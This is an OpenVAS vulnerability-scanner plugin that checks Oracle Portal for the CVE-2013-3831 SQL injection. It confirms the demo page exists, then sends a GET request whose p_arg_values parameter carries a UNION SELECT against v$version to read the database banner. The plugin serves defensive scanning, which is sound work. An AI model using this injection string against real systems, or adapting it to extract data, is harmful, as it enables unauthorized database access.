###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_portaldemo_orgchart_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Oracle Portal Demo Organization Chart SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803772";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3831");
  script_bugtraq_id(63043);
  script_tag(name:"cvss_base", value:"5.5");
  script_tag(name:"cvss_base_vetor", value:"AV:N/AC:L/Au:S/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-21 13:54:36 +0530 (Mon, 21 Oct 2013)");
  script_name("Oracle Portal Demo Organization Chart SQL Injection Vulnerability");

  tag_summary =
"This host is running Oracle Portal Demo Organization Chart and is prone to
sql injection vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it
is able to read the database information or not.";

  tag_insight =
"Input passed via the 'p_arg_values' parameter to /pls/portal/PORTAL_DEMO.ORG
_CHART.SHOW is not properly sanitized before being used in a sql query.";

  tag_impact =
"Successful exploitation will allow remote attackers to manipulate SQL queries
by injecting arbitrary SQL code.

Impact Level: Application";

  tag_affected =
"Oracle Portal version 11.1.1.6.0 and prior.";

  tag_solution =
"Apply the patch from below link,
http://www.oracle.com/technetwork/topics/security/cpuoct2013-1899837.html";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/98469");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/55332");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/123650");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Oct/111");
  script_xref(name : "URL" , value : "http://www.oracle.com/technetwork/topics/security/cpuoct2013-1899837.html");
  script_summary("Check if Oracle Portal is vulnerable to SQL injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable initialization
req = "";
res = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item:string("/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW"), port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Confirm the application before trying exploit
if(">Organization Chart<" >!< res){
  exit(0);
}

url = "/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW?p_arg_names=_max_levels" +
      "&p_arg_values=1&p_arg_names=_start_with_field&p_arg_values=nul" +
      "l&p_arg_names=_start_with_value&p_arg_values=:p_start_with_val" +
      "ue'union+select+banner,null,null,null,null+from+v$version--";

## Confirm exploit worked by checking the response
if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"SQL Release", extra_check: make_list(">Oracle Database",
   ">NLSRTL Version")))
{
  security_hole(port);
  exit(0);
}
